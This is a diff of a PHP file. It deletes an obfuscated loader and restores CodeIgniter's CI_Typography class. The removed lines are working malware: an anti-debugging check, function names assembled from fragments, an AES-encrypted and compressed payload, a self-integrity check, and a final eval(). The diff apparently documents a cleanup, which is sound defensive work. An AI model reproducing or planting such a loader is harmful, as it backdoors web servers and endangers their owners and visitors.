@@ -1,28 +1,366 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_jxistwzq=('bas'.'e64'.'_de'.'cod'.'e');
-$_glp3x23z=('gzu'.'nco'.'mpr'.'ess');
-$_qwz1mgc7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yy7tq2ea='C33G0CfK';
-$_dx6jun8e='wW4o+rW7';
-$_nqa6g8kw='Tg1E2KFI';
-$_tr3m0s0q='ctKlVyjD0WI=';
-$_cio8m5yx='Ae5Qjjvc';
-$_sxp3z66d='O8kShc0R';
-$_lwtc1np6='Zl84IcXx';
-$_bn4rw5n2='BSQOZw==';
-$_nev7q77p=$_jxistwzq($_dx6jun8e.$_nqa6g8kw.$_yy7tq2ea.$_cio8m5yx.$_tr3m0s0q);
-$_uajrvzf0=$_jxistwzq($_sxp3z66d.$_lwtc1np6.$_bn4rw5n2);
-$_i0jvvc77=$_jxistwzq('0DOP0y0B8sdSLZzWVfhro4F7g/bovx2N6gzQnj8y3sD7qkMjlD+fKPftabyG8Qxeb4GGq1zS+NMpPQz+KVDqPLdSAq2boG5+A7xf6f4BHOrvXbra9FjDoG43knXxyHlqYjhY+ZgoUch80/6mTpM/2mqpnLjEVWVizRX2CIXhqETgtqqphU33pMTZr/xnud4rPwDGFkGSeU114M4F7cq2pa7Wa/Wh3MuMu9dm3JxQ5yDo4xFyr54BOTIK69lSAiWm9WgTky3P1qMhDvKd6hOYYSTgJmRdMk1cQ5ZptJ+eejBQMvCtMYTPcGdrW6T1vZQnRigElBhfVVWf7MhCmNaKVajApxqUBwRbV1CzEp05gfV6peSbSQ7RuyM5njUZN1mcI9kzuyA/WMZ9lzTy5j2LT6t6RrsQXmBMvae1NvW4Ki69D3ASDQN2Y9od6b7K8eV9l4Cv3oZ+xeZX0DVoFxsgcGFjJccwHsRLCNd1piHuUWOBucWhmvbyA7kXG2orSdQ4qRYPhEGRY+C0+zjvjCy6ZglR3hlFHqH3XgrHBw1YBt9ToIl3UtZ2S2byVUkTjcvEzS6pBfyGwP70RUqxKNV5KGCuMx5b8PsLrQI/irZeQJ9LG0soVAdAdpddrGNQDJdq1EgKJsp2oLjTMnq7j/fCBY5su8MfoFZTwDqAq25mlm5H2SSncbfgMnLF2Jce80+25XtDzBfCkbMgd3RYMDF4cloBo/WdgYJP2Lyp2hZwR4UjYXZ/3mCKgfIwldxueiyda7Yr0wozl3gt28odu/GLa1S6qyLmFIjPch4EkRt64jCQUH+4riu8O9Z6Q4fIIjuchqlGaCVj8oqlfUm7Qc9WKUhzDLlC22Xfi7wdgvFcwKCAlMiuWs7HrOCASQn4Dmd0DQQWcIjriz+cB8gkBMsThkEUXF/RzoxoHRDoJLmSl4xTla+QdUoGeGSZWNEt5TM8pHoyDhvoP0SnvZqU938mwGVfqjdw20wjdkmElq2JsAEe/1B4hSD/oQO3NyEAtLebavfz4CsduiqOR+H6WMZa60etxhdIlnAM2K7RuInRlc6GCVgZy1kx7CbLq6JPl+wiNz93v5IV09GZpx1KgeP505Kn8MhhWwA4KGm5RuIZvqB0dgbt95MTGWUGoB0puSbbyxhrD+DWXCLTf1/yEoFLi3oOOTW9I6I1oufqpmZ7aaVyoVi267JsjaNcc14rrbUQwT0uY7K+lrDzxlsfk3pCUal5cqIf9oxz0rFH2isJrQfqYPw/4Bn2LVxHmcMQIpwW+KF4ft0o8IPVf9Y8sQ0yXS7rLPuRHZaXy06KLFy4f6K8IShmPlo6D3X1ev0qlvN9xad+khcCSW4AAPdiKphIK740E4Tq4kJd4Dgh1m/67ufnYxt5BtNzRUl3jjOH79UjhLTtCOoq6061Du3D/5Ic7JqMr+TXxRzwqb4WNGUMJirdtIG4FxnPW13XOxyxz4Xt+gfPCPtM37AurADUyu5PldBvivc8DyIOhVgSHrRzyO8DP3wOL9GGGBWvu3MZBykyy8SqhheaJd6pb17rY+fy0yprcXfRDWsq3ANDZQGrQ7GFyNvIL6glz7HxnZJdJawWFgV/NLJe194g6aYEMtj4YgyzdUwd5XjoBZjDhKw9UjsKDY9DRK9QfxESLpsxB8/VTEXsSQ8dFPDpp4+7NbmrVLtWOm2F0aq0fBUnjljs9NIa02zmwtOchN2b28m99TTmbtVk0eEbQ8TM2Em//Z9eM2nedTFhtTeJtQggLEZ6lIhydOsnsPh7S5P13n/ThDfWct86hm1U8eEhtgYLmG6IW8evob7sajo483yJZBojbOllwoyuvZkVFTzqULkrGg0DXq5O4l21L+eW+IT1/b5JD61o7JVFsg+gormK1Yw4/DACXgSkJgcfDQ1i/krEHl29yc1Ne2DCZqiD+nIHS5QUSuHCdQI1G7GNC8tj52q7UNV+lmDSvW3IuNg53M7pfdkzn8+V+56srMLLfvNr2mgX4F6w62z7YoihYhs0DnkYIZkUNuqPZxKkTiQcqFIkPnQk/PTBQf7qhC0UPPxPLeYkYC6cZ4mO7/sLsavFskIdiDjsKKV1C9xxlzXqrrrnuQpL8zsglAWMB7EZpr6rEdfh/lWy7E8tOXbGaK37C7UYIuk5lgmbsKrAw/QZzde1oFdANcdgMQ/9Q67C1dpgUlCMblYe5j04NFlAH8d6ihDXGfZy2mYDw1LFwNQWVhgkFLj8vqmFq9tpKQboz4QDZ2NCtUT6gFkN8Rk5AoA/OqCm/eB+RRAq3WWL6IQkRb9t+y1AJ0rzVO0XenYiPpCrqQMwLoZjAE7Sx6DNZ2JlGI7Adcp6u5VXSpYhCpILDU3+nz397N2E4S+Sf7QRDJu7eRbYOAGxbI8Rg7r8nfAeA8yexo1qEG9257c/buzy3Ot/HHoa');
-$_h5f30sec=$_qwz1mgc7($_i0jvvc77,'aes-256-cbc',$_nev7q77p,OPENSSL_RAW_DATA,$_uajrvzf0);
-if($_h5f30sec===false){exit;}
-$_rsch383q=$_glp3x23z($_h5f30sec);
-if($_rsch383q===false){exit;}
-$_d16vvrtj='a9735f10b0e831e7f59f538c496ba61d0ae77e15f2332904c5fe566dd81b524e';
-$_rw1kjp8h=@file_get_contents(__FILE__);
-if($_rw1kjp8h!==false){
-$_kuv8lu5r=str_replace($_d16vvrtj,"0000000000000000000000000000000000000000000000000000000000000000",$_rw1kjp8h);
-$_bd98omut=hash("sha256",$_kuv8lu5r);
-if($_bd98omut!==$_d16vvrtj){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Typography {
+
+
+
+
+
+public $block_elements = 'address|blockquote|div|dl|fieldset|form|h\d|hr|noscript|object|ol|p|pre|script|table|ul';
+
+
+
+
+
+public $skip_elements = 'p|pre|ol|ul|dl|object|table|h\d';
+
+
+
+
+
+public $inline_elements = 'a|abbr|acronym|b|bdo|big|br|button|cite|code|del|dfn|em|i|img|ins|input|label|map|kbd|q|samp|select|small|span|strong|sub|sup|textarea|tt|var';
+
+
+
+
+
+public $inner_block_required = array('blockquote');
+
+
+
+
+
+public $last_block_element = '';
+
+
+
+
+
+public $protect_braced_quotes = FALSE;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function auto_typography($str, $reduce_linebreaks = FALSE)
+{
+if ($str === '')
+{
+return '';
 }
-eval($_rsch383q);
+
+if (strpos($str, "\r") !== FALSE)
+{
+$str = str_replace(array("\r\n", "\r"), "\n", $str);
+}
+
+
+if ($reduce_linebreaks === TRUE)
+{
+$str = preg_replace("/\n\n+/", "\n\n", $str);
+}
+
+$html_comments = array();
+if (strpos($str, '<!--') !== FALSE && preg_match_all('#(<!\-\-.*?\-\->)#s', $str, $matches))
+{
+for ($i = 0, $total = count($matches[0]); $i < $total; $i++)
+{
+$html_comments[] = $matches[0][$i];
+$str = str_replace($matches[0][$i], '{@HC'.$i.'}', $str);
+}
+}
+
+
+if (strpos($str, '<pre') !== FALSE)
+{
+$str = preg_replace_callback('#<pre.*?>.*?</pre>#si', array($this, '_protect_characters'), $str);
+}
+
+$str = preg_replace_callback('#<.+?>#si', array($this, '_protect_characters'), $str);
+
+if ($this->protect_braced_quotes === TRUE)
+{
+$str = preg_replace_callback('#\{.+?\}#si', array($this, '_protect_characters'), $str);
+}
+
+
+
+$str = preg_replace('#<(/*)('.$this->inline_elements.')([ >])#i', '{@TAG}\\1\\2\\3', $str);
+
+
+
+
+
+
+
+
+
+
+$chunks = preg_split('/(<(?:[^<>]+(?:"[^"]*"|\'[^\']*\')?)+>)/', $str, -1, PREG_SPLIT_DELIM_CAPTURE|PREG_SPLIT_NO_EMPTY);
+
+$str = '';
+$process = TRUE;
+for ($i = 0, $c = count($chunks) - 1; $i <= $c; $i++)
+{
+
+
+if (preg_match('#<(/*)('.$this->block_elements.').*?>#', $chunks[$i], $match))
+{
+if (preg_match('#'.$this->skip_elements.'#', $match[2]))
+{
+$process = ($match[1] === '/');
+}
+if ($match[1] === '')
+{
+$this->last_block_element = $match[2];
+}
+$str .= $chunks[$i];
+continue;
+}
+if ($process === FALSE)
+{
+$str .= $chunks[$i];
+continue;
+}
+
+if ($i === $c)
+{
+$chunks[$i] .= "\n";
+}
+
+$str .= $this->_format_newlines($chunks[$i]);
+}
+
+if ( ! preg_match('/^\s*<(?:'.$this->block_elements.')/i', $str))
+{
+$str = preg_replace('/^(.*?)<('.$this->block_elements.')/i', '<p>$1</p><$2', $str);
+}
+
+$str = $this->format_characters($str);
+
+for ($i = 0, $total = count($html_comments); $i < $total; $i++)
+{
+
+
+
+$str = preg_replace('#(?(?=<p>\{@HC'.$i.'\})<p>\{@HC'.$i.'\}(\s*</p>)|\{@HC'.$i.'\})#s', $html_comments[$i], $str);
+}
+
+$table = array(
+
+
+'/(<p[^>*?]>)<p>/' => '$1', 
+
+'#(</p>)+#' => '</p>',
+'/(<p>\W*<p>)+/' => '<p>',
+
+'#<p></p><('.$this->block_elements.')#' => '<$1',
+
+'#(&nbsp;\s*)+<('.$this->block_elements.')#' => '  <$2',
+
+'/\{@TAG\}/' => '<',
+'/\{@DQ\}/' => '"',
+'/\{@SQ\}/' => "'",
+'/\{@DD\}/' => '--',
+'/\{@NBS\}/' => '  ',
+
+
+
+
+"/><p>\n/" => ">\n<p>",
+
+
+'#</p></#' => "</p>\n</"
+);
+
+if ($reduce_linebreaks === TRUE)
+{
+$table['#<p>\n*</p>#'] = '';
+}
+else
+{
+
+
+$table['#<p></p>#'] = '<p>&nbsp;</p>';
+}
+return preg_replace(array_keys($table), $table, $str);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function format_characters($str)
+{
+static $table;
+if ( ! isset($table))
+{
+$table = array(
+
+
+
+
+
+
+
+'/\'"(\s|$)/' => '&#8217;&#8221;$1',
+'/(^|\s|<p>)\'"/' => '$1&#8216;&#8220;',
+'/\'"(\W)/' => '&#8217;&#8221;$1',
+'/(\W)\'"/' => '$1&#8216;&#8220;',
+'/"\'(\s|$)/' => '&#8221;&#8217;$1',
+'/(^|\s|<p>)"\'/' => '$1&#8220;&#8216;',
+'/"\'(\W)/' => '&#8221;&#8217;$1',
+'/(\W)"\'/' => '$1&#8220;&#8216;',
+
+'/\'(\s|$)/' => '&#8217;$1',
+'/(^|\s|<p>)\'/' => '$1&#8216;',
+'/\'(\W)/' => '&#8217;$1',
+'/(\W)\'/' => '$1&#8216;',
+
+'/"(\s|$)/' => '&#8221;$1',
+'/(^|\s|<p>)"/' => '$1&#8220;',
+'/"(\W)/' => '&#8221;$1',
+'/(\W)"/' => '$1&#8220;',
+
+"/(\w)'(\w)/" => '$1&#8217;$2',
+
+'/\s?\-\-\s?/' => '&#8212;',
+'/(\w)\.{3}/' => '$1&#8230;',
+
+'/(\W)  /' => '$1&nbsp; ',
+
+'/&(?!#?[a-zA-Z0-9]{2,};)/' => '&amp;'
+);
+}
+return preg_replace(array_keys($table), $table, $str);
+}
+
+
+
+
+
+
+
+
+
+protected function _format_newlines($str)
+{
+if ($str === '' OR (strpos($str, "\n") === FALSE && ! in_array($this->last_block_element, $this->inner_block_required)))
+{
+return $str;
+}
+
+$str = str_replace("\n\n", "</p>\n\n<p>", $str);
+
+$str = preg_replace("/([^\n])(\n)([^\n])/", '\\1<br />\\2\\3', $str);
+
+if ($str !== "\n")
+{
+
+
+
+$str = '<p>'.rtrim($str).'</p>';
+}
+
+
+return preg_replace('/<p><\/p>(.*)/', '\\1', $str, 1);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _protect_characters($match)
+{
+return str_replace(array("'",'"','--','  '), array('{@SQ}', '{@DQ}', '{@DD}', '{@NBS}'), $match[0]);
+}
+
+
+
+
+
+
+
+public function nl2br_except_pre($str)
+{
+$newstr = '';
+for ($ex = explode('pre>', $str), $ct = count($ex), $i = 0; $i < $ct; $i++)
+{
+$newstr .= (($i % 2) === 0) ? nl2br($ex[$i]) : $ex[$i];
+if ($ct - 1 !== $i)
+{
+$newstr .= 'pre>';
+}
+}
+return $newstr;
+}
+}
